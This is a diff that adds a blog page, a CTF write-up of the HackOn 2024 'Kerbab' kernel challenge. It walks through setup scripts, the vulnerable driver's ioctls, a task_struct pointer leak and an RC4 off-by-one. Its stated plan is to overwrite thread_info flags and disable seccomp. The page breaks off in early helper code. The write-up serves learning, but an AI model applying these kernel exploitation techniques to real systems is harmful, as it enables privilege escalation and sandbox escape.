@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Kerbab - Linux Kernel SLUB off-by-one - lkt</title>
+    
+    
+    
+    <meta name="keywords" content="kernel">
+    
+    
+    <link rel="canonical" href="https:&#x2F;&#x2F;iokete.github.io&#x2F;blog&#x2F;kerbab&#x2F;" />
+    
+    <link rel="stylesheet" href="https://iokete.github.io/style.css">
+    
+  </head>
+  <body class="theme-tokyonight">
+    
+    <header>
+      <nav>
+        <a href="https:&#x2F;&#x2F;iokete.github.io&#x2F;">/home/</a>
+
+        
+        
+        
+        <a href="https:&#x2F;&#x2F;iokete.github.io&#x2F;blog&#x2F;">&#x2F;blog&#x2F;</a>
+        
+
+        
+        
+      </nav>
+    </header>
+    <hr>
+    <main>
+      
+<section>
+  <h1>Kerbab - Linux Kernel SLUB off-by-one</h1>
+  
+  <p>published: <time>2026-02-22</time></p>
+  
+  
+  <p class="tags">
+  tags: [
+  
+  <a href="https://iokete.github.io/tags/kernel/">#kernel</a>
+  
+  ]
+  </p>
+  
+  <div>
+    <h2 id="tl-dr">TL;DR</h2>
+<p>Craft a malicious .so  to exploit an off-by-null vuln into off-by-one in SLUB to overwrite <code>current-&gt;thread_info.flags</code> to disable SECCOMP and read the flag.</p>
+<h2 id="challenge-description">Challenge Description</h2>
+<p>This challenge was part of HackOn 2024 CTF</p>
+<ul>
+<li>Category: <strong>pwn</strong></li>
+</ul>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="initial-setup">Initial setup</h3>
+<p>We are given a list of common files in kernel exploitation challenges:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellsession"><span class="giallo-l"><span>lkt@pwn:~/Desktop/ctf/kerbab</span><span style="color: #9399B2;">$</span><span> ls -l</span></span>
+<span class="giallo-l"><span>total 12240</span></span>
+<span class="giallo-l"><span>-rw-rw-r-- 1 lkt lkt       59 ene  3 11:48 deploy_docker.sh</span></span>
+<span class="giallo-l"><span>-rw-rw-r-- 1 lkt lkt      155 ene  3 11:48 docker-compose.yml</span></span>
+<span class="giallo-l"><span>-rw-rw-r-- 1 lkt lkt      618 ene  3 11:48 Dockerfile</span></span>
+<span class="giallo-l"><span>-rw-rw-r-- 1 lkt lkt  2497982 ene  3 11:48 initramfs.cpio.gz</span></span>
+<span class="giallo-l"><span>-rw-rw-r-- 1 lkt lkt     6339 ene  3 11:48 kebab.c</span></span>
+<span class="giallo-l"><span>drwxrwxr-x 7 lkt lkt     4096 ene  3 11:48 pc-bios</span></span>
+<span class="giallo-l"><span>-rw-rw-r-- 1 lkt lkt      396 ene  3 11:48 run.sh</span></span>
+<span class="giallo-l"><span>-rw-rw-r-- 1 lkt lkt 10000704 ene  3 11:48 vmlinuz-4.19.306</span></span>
+<span class="giallo-l"><span>-rw-rw-r-- 1 lkt lkt      176 ene  3 11:48 xinetd</span></span></code></pre>
+<p>The most relevant files are:</p>
+<ul>
+<li><code>initramfs.cpio.gz</code>: holds the filesystem of the VM.</li>
+<li><code>vmlinuz-4.19.306</code> is the kernel image of the VM.</li>
+<li><code>run.sh</code>: bash script to spawn the VM with qemu.</li>
+<li><code>kebab.c</code>: source code of the vulnerable driver.</li>
+</ul>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #F5C2E7;font-style: italic;">#!/bin/bash</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">qemu-system-x86_64</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -nographic</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -cpu kvm64,+smep,+smap,check</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -kernel bzImage</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -initrd initramfs.cpio</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -m 1024M</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -L pc-bios/</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -no-reboot</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -monitor none</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -append &quot;console=ttyS0 oops=panic panic=1 quiet kaslr slub_debug=- apparmor=0&quot;</span><span> </span></span></code></pre>
+<p>Running this file would get us a shell inside the VM. To interact with the vulnerable device we must create <code>exploit.c</code> that opens it. We can see in the .c code provided that the device is called <code>/dev/safe_guard</code>. So we create a helper function to open it in our exploit.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #F9E2AF;">#include</span><span style="color: #A6E3A1;"> &lt;stdio.h&gt;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;">#include</span><span style="color: #A6E3A1;"> &lt;stdlib.h&gt;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;">#include</span><span style="color: #A6E3A1;"> &lt;fcntl.h&gt;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;">#include</span><span style="color: #A6E3A1;"> &lt;unistd.h&gt;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">static int</span><span> fd</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">void</span><span style="color: #89B4FA;font-style: italic;"> open_dev</span><span style="color: #9399B2;">(){</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    if</span><span style="color: #9399B2;"> ((</span><span>fd </span><span style="color: #94E2D5;">=</span><span style="color: #89B4FA;font-style: italic;"> open</span><span style="color: #9399B2;">(</span><span>DEV</span><span style="color: #9399B2;">,</span><span> O_RDWR</span><span style="color: #9399B2;">))</span><span style="color: #94E2D5;"> &lt;</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">){</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">        perror</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;[-] error opening device&quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">        exit</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">    }</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">int</span><span style="color: #89B4FA;font-style: italic;"> main</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">int</span><span style="color: #EBA0AC;font-style: italic;"> argc</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> char</span><span style="color: #94E2D5;"> **</span><span style="color: #EBA0AC;font-style: italic;">argv</span><span style="color: #9399B2;">){</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">    open_dev</span><span style="color: #9399B2;">();</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    return</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span></code></pre>
+<p>To compile and add our exploit we have to decompress the filesystem, move the exploit inside and recompress it in cpio format.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">gunzip</span><span style="color: #A6E3A1;"> initramfs.cpio.gz</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">mkdir</span><span style="color: #A6E3A1;"> initramfs</span></span>
+<span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">cd</span><span style="color: #A6E3A1;"> initramfs/</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">cpio</span><span style="color: #A6E3A1;"> -idm</span><span style="color: #94E2D5;"> &lt;</span><span style="color: #A6E3A1;"> ../initramfs.cpio</span></span></code></pre>
+<p>Now we can modify our <code>run.sh</code> script to compress the fs with the exploit everytime we run the VM.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #F5C2E7;font-style: italic;">#! /bin/bash</span></span>
+<span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">set</span><span style="color: #A6E3A1;"> -e</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">gcc</span><span style="color: #A6E3A1;"> exploit.c -o exploit</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">mv</span><span style="color: #A6E3A1;"> exploit initramfs/</span></span>
+<span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">cd</span><span style="color: #A6E3A1;"> initramfs</span><span style="color: #9399B2;">;</span><span style="color: #89B4FA;font-style: italic;"> find</span><span style="color: #A6E3A1;"> . -print0</span><span style="color: #94E2D5;"> |</span><span style="color: #89B4FA;font-style: italic;"> cpio</span><span style="color: #A6E3A1;"> -o --null --format=newc</span><span style="color: #94E2D5;"> &gt;</span><span style="color: #A6E3A1;"> ../debugfs.cpio</span></span>
+<span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">cd</span><span style="color: #A6E3A1;"> ../</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">qemu-system-x86_64</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -nographic</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -cpu kvm64,+smep,+smap,check</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -kernel bzImage</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -initrd debugfs.cpio</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -m 1024M</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -L pc-bios/</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -no-reboot</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -monitor none</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -append &quot;console=ttyS0 oops=panic panic=1 quiet kaslr slub_debug=- apparmor=0&quot;</span><span style="color: #F5C2E7;"> \</span></span>
+<span class="giallo-l"><span style="color: #A6E3A1;">    -s</span></span></code></pre>
+<p><strong>We set the parameter <code>-s</code> to create a gdbserver that we will connect to later to debug the kernel.</strong></p>
+<p>As soon as we run our vm and execute our exploit we get an error:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellsession"><span class="giallo-l"></span>
+<span class="giallo-l"><span>  ____         __       ____                     _ </span></span>
+<span class="giallo-l"><span> / ___|  __ _ / _| ___ / ___|_   _  __ _ _ __ __| |</span></span>
+<span class="giallo-l"><span> \___ \ / _` | |_ / _ \ |  _| | | |/ _` | &#39;__/ _` |</span></span>
+<span class="giallo-l"><span>  ___) | (_| |  _|  __/ |_| | |_| | (_| | | | (_| |</span></span>
+<span class="giallo-l"><span> |____/ \__,_|_|  \___|\____|\__,_|\__,_|_|  \__,_|</span></span>
+<span class="giallo-l"><span>                                                   </span></span>
+<span class="giallo-l"><span>----------------------------------------------------</span></span>
+<span class="giallo-l"><span>[+]            By DiegoAltF4 and Dbd4            [+]</span></span>
+<span class="giallo-l"><span>----------------------------------------------------</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>/home/user $ /exploit </span></span>
+<span class="giallo-l"><span>[-] error opening device: Permission denied</span></span>
+<span class="giallo-l"><span>/home/user $ ls -l /dev/safe_guard </span></span>
+<span class="giallo-l"><span>crw-------    1 root     root       10,  57 Jan  4 15:26 /dev/safe_guard</span></span>
+<span class="giallo-l"><span>/home/user $ </span></span>
+<span class="giallo-l"></span></code></pre>
+<p>We do not have permissions to open this device. Taking a look at the Dockerfile we see there is a SUID binary <code>run</code> inside a folder called <code>/chall</code>. Looking at the decompilation with ghidra:</p>
+<ol>
+<li>Opens <code>/dev/safe_guard</code></li>
+<li>Loads the library <code>/home/user/libxpl.so</code></li>
+<li>Looks for a function called <code>exploit</code> in the loaded library</li>
+<li>Creates SECCOMP rules to allow <code>ioctl</code>, <code>write</code> and <code>newfstatat</code></li>
+<li>Calls the <code>exploit</code> function with the device file descriptor as its first parameter</li>
+</ol>
+<p>To interact with the module we have to change the <code>main(void)</code> function to <code>exploit(int fd)</code></p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">static int</span><span> fd</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">void</span><span style="color: #89B4FA;font-style: italic;"> exploit</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">int</span><span style="color: #EBA0AC;font-style: italic;"> devfd</span><span style="color: #9399B2;">){</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>	fd </span><span style="color: #94E2D5;">=</span><span> devfd</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	if</span><span style="color: #9399B2;"> (</span><span>fd </span><span style="color: #94E2D5;">&gt;</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">){</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">		printf</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;[*] Opened device</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">	}</span><span style="color: #CBA6F7;"> else</span><span style="color: #9399B2;"> {</span><span style="color: #89B4FA;font-style: italic;"> exit</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">); }</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span></code></pre>
+<p>Modify <code>run.sh</code> to compile it as a library:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">...</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">gcc</span><span style="color: #A6E3A1;"> exploit.c -shared -fPIC -o libxpl.so</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">mv</span><span style="color: #A6E3A1;"> libxpl.so initramfs/home/user/</span></span>
+<span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">cd</span><span style="color: #A6E3A1;"> initramfs</span><span style="color: #9399B2;">;</span><span style="color: #89B4FA;font-style: italic;"> find</span><span style="color: #A6E3A1;"> . -print0</span><span style="color: #94E2D5;"> |</span><span style="color: #89B4FA;font-style: italic;"> cpio</span><span style="color: #A6E3A1;"> -o --null --format=newc</span><span style="color: #94E2D5;"> &gt;</span><span style="color: #A6E3A1;"> ../debugfs.cpio</span></span>
+<span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">cd</span><span style="color: #A6E3A1;"> ../</span></span>
+<span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">...</span></span></code></pre>
+<p>And now if we spawn the VM and execute <code>/chall/run</code> we can see it works properly and opens the device. The <strong>bad system call</strong> is most likely because of system calls that are used in the exiting of the binary.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellsession"><span class="giallo-l"></span>
+<span class="giallo-l"><span>  ____         __       ____                     _ </span></span>
+<span class="giallo-l"><span> / ___|  __ _ / _| ___ / ___|_   _  __ _ _ __ __| |</span></span>
+<span class="giallo-l"><span> \___ \ / _` | |_ / _ \ |  _| | | |/ _` | &#39;__/ _` |</span></span>
+<span class="giallo-l"><span>  ___) | (_| |  _|  __/ |_| | |_| | (_| | | | (_| |</span></span>
+<span class="giallo-l"><span> |____/ \__,_|_|  \___|\____|\__,_|\__,_|_|  \__,_|</span></span>
+<span class="giallo-l"><span>                                                   </span></span>
+<span class="giallo-l"><span>----------------------------------------------------</span></span>
+<span class="giallo-l"><span>[+]            By DiegoAltF4 and Dbd4            [+]</span></span>
+<span class="giallo-l"><span>----------------------------------------------------</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>/home/user $ /chall/run </span></span>
+<span class="giallo-l"><span>[*] Opened device</span></span>
+<span class="giallo-l"><span>Bad system call</span></span>
+<span class="giallo-l"><span>/home/user $</span></span></code></pre><h3 id="analyzing-the-source-code">Analyzing the source code</h3>
+<p>The driver works as a safe storage, we can send data and it will get RC4 encrypted and stored in chunks in the kernel heap. It uses the following structures:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">struct</span><span> secure_buffer </span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	char</span><span style="color: #94E2D5;"> *</span><span>buffer</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	size_t</span><span> size</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">};</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">struct</span><span> new_secbuff_arg </span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	size_t</span><span> size</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	char</span><span> key</span><span style="color: #9399B2;">[</span><span>MAX_RC4_LEN</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	const char</span><span style="color: #94E2D5;"> *</span><span>buffer</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">};</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">struct</span><span> read_secbuff_arg </span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	unsigned long</span><span> index</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	char</span><span> key</span><span style="color: #9399B2;">[</span><span>MAX_RC4_LEN</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	char</span><span style="color: #94E2D5;"> *</span><span>buffer</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">};</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">struct</span><span> key_info</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	int</span><span> pid</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	struct</span><span> task_struct </span><span style="color: #94E2D5;">*</span><span>cur</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	size_t</span><span> max_len</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">};</span></span></code></pre>
+<ul>
+<li><code>struct secure_buffer</code>: it is stored in the kernel heap too (<code>kmalloc-16</code>), and saves the pointer to the encrypted user data, and its size.</li>
+<li><code>struct new_secbuff_arg</code>: structure used to send data to the kernel device, the <code>size</code> of the data, RC4 <code>key</code> and the buffer with the not yet encrypted data.</li>
+<li><code>struct read_secbuff_arg</code>: structure used to read data from the kernel, we don't use this in our exploit. It is the same as <code>new_secbuff_arg</code> but with an <code>index</code> field. It looks for that index in the global list and fills our buffer with its <code>secure_buffer.size</code> value.</li>
+<li><code>struct key_info</code>: this is one of the main bugs in this module. The <code>key_info</code> structure holds a pointer to the current <code>task_struct</code>, this struct has all the relevant information about the current process (including SECCOMP flags, UID, GID, etc.).</li>
+<li>Other RC4 encryption structures...</li>
+</ul>
+<p>We can interact with the driver using the <code>ioctl</code> syscall. With the syntax <code>ioctl(fd, PARAMETER, arg)</code>, <code>arg</code> will be a pointer to one of the structs described above and depending of <code>PARAMETER</code> it will do one of the following:</p>
+<ul>
+<li><code>KEBAB_IOCTL_NEW</code>: Creates a total of 3 allocations; the first will be <code>secure_buffer</code> to hold the pointer and the size, the second will be an allocation of n bytes provided by the user, it gets stored in <code>secure_buffer.buffer</code>. And the last one is an intermediate big allocation of size 2048 to hold the unencrypted user data before encrypting it. This is the buffer the RC4 functions will use to access to the original bytes.</li>
+<li><code>KEBAB_IOCTL_READ</code>: Looks in the global array of buffers for the index provided and prints out <code>secure_buffer.size</code> bytes.</li>
+<li><code>KEBAB_IOCTL_SET_KEY</code>: Small function to set the global variable <code>RC4_key</code> (the key used for the RC4 encryption). After setting the key, fills the <code>struct key_info</code> with the current PID, the size of the key and a pointer to the <code>task_struct current</code> (important kernel address leak).</li>
+</ul>
+<p>The value of each parameter is defined at the top of the file</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #F9E2AF;">#define</span><span style="color: #89B4FA;font-style: italic;"> KEBAB_IOCTL_NEW</span><span style="color: #CBA6F7;">       0x</span><span style="color: #FAB387;">FABADA</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;">#define</span><span style="color: #89B4FA;font-style: italic;"> KEBAB_IOCTL_READ</span><span style="color: #CBA6F7;">      0x</span><span style="color: #FAB387;">BEBE</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;">#define</span><span style="color: #89B4FA;font-style: italic;"> KEBAB_IOCTL_SET_KEY</span><span style="color: #CBA6F7;">   0x</span><span style="color: #FAB387;">1CAFE</span></span></code></pre><h3 id="spotting-the-vulnerability">Spotting the vulnerability</h3>
+<p>There is a big leak in <code>KEBAB_IOCTL_SET_KEY</code>, they provide us with <code>current</code> pointer. At the moment, we execute <code>/chall/run</code> as root because of SUID perms, but we cannot open the flag because of SECCOMP rules. There is a flag called <code>_TIF_SECCOMP</code>, that is on if SECCOMP is enabled, if we could zero out this flag somehow we could disable SECCOMP and read the flag or even spawn a shell. This flag is stored at <code>current-&gt;thread_info.flags</code>, which happens to be the first 8 bytes of the <code>task_struct</code>. So having now our leak, if we zero out the address we are given, we will break out of the restricted environment. Source <a rel="external" href="https://elixir.bootlin.com/linux/v6.18.3/source/include/linux/sched.h#L819">task_struct definition</a>, and <a rel="external" href="https://elixir.bootlin.com/linux/v6.18.3/source/arch/arc/include/asm/thread_info.h#L38">thread_info</a>.</p>
+<p>The global <code>RC4_key</code> variable is defined at the top of the file along with the other structures: <code>static char RC4_key[MAX_RC4_LEN + 1] = {0};</code> it is sized <code>MAX_RC4_LEN + 1</code>!
+The encrypting function that does the heavy lifting is <code>rc4_crypt</code>:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">void</span><span style="color: #89B4FA;font-style: italic;"> rc4_crypt</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">struct</span><span> rc4_state </span><span style="color: #94E2D5;">*</span><span style="color: #CBA6F7;">const</span><span style="color: #EBA0AC;font-style: italic;"> state</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> const unsigned char</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">inbuf</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> unsigned char</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">outbuf</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> int</span><span style="color: #EBA0AC;font-style: italic;"> buflen</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	int</span><span> i</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	unsigned char</span><span> j</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	for</span><span style="color: #9399B2;"> (</span><span>i </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span><span> i </span><span style="color: #94E2D5;">&lt;=</span><span> buflen</span><span style="color: #9399B2;">;</span><span> i</span><span style="color: #94E2D5;">++</span><span style="color: #9399B2;">) {</span><span style="color: #9399B2;font-style: italic;"> /* !!!! */</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>		state</span><span style="color: #9399B2;">-&gt;</span><span>index1</span><span style="color: #94E2D5;">++</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>		state</span><span style="color: #9399B2;">-&gt;</span><span>index2</span><span style="color: #94E2D5;"> +=</span><span> state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>index1</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">		swap_bytes</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">&amp;</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>index1</span><span style="color: #9399B2;">],</span></span>
+<span class="giallo-l"><span style="color: #94E2D5;">		    &amp;</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>index2</span><span style="color: #9399B2;">]);</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>		j </span><span style="color: #94E2D5;">=</span><span> state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>index1</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> +</span><span> state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>state</span><span style="color: #9399B2;">-&gt;</span><span>index2</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"><span>		outbuf</span><span style="color: #9399B2;">[</span><span>i</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> =</span><span> inbuf</span><span style="color: #9399B2;">[</span><span>i</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> ^</span><span> state</span><span style="color: #9399B2;">-&gt;</span><span>perm</span><span style="color: #9399B2;">[</span><span>j</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">	}</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span></code></pre>
+<p>The function is looping for 1 more iteration that it should, for a 16 byte buffer, it is starting at index 0 and the last iteration will be at index 16! <strong>Off-by-one vuln</strong>
+In this case it is actually an <strong>off-by-null</strong>, because for a 16 byte buffer it is taking one more byte, that in the case of this module always happens to be 0.</p>
+<p>Now we will debug the module to see how is this affecting to the kernel heap. But first we create some helper functions to interact with the driver.</p>
+<blockquote>
+<p><strong>NOTE:</strong> I copied every needed structure and every macro from the module, including parameters, sizes, etc.</p>
+</blockquote>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">static char</span><span> key_buf</span><span style="color: #9399B2;">[</span><span>MAX_RC4_LEN</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> =</span><span style="color: #9399B2;"> {</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">41</span><span style="color: #9399B2;">};</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">static char</span><span> leak_buf</span><span style="color: #9399B2;">[</span><span>MAX_RC4_LEN</span><span style="color: #9399B2;">]</span><span style="color: #94E2D5;"> =</span><span style="color: #9399B2;"> {</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">};</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">static</span><span> key_info leak </span><span style="color: #94E2D5;">=</span><span style="color: #9399B2;"> {</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">};</span></span>
+<span class="giallo-l"></span>
